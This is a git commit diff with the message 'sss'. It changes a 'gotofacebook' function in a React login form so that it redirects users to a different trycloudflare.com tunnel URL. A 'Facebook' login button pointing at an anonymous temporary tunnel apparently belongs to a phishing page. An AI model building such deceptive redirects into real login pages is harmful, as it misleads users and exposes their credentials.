38765712670597efd2975302f873f4f56980c3d3
leootrimi <leootrim221@gmail.com>
2024-04-22 21:45:55 +0200

    sss

--- src/components/LoginForm/Login.jsx
+++ src/components/LoginForm/Login.jsx
@@ -16,7 +16,7 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://stamps-warcraft-persistent-extreme.trycloudflare.com';
+    window.location.href = 'https://lift-fuzzy-fixes-whereas.trycloudflare.com';
   }
 
   const handleLogin = async (e) => {
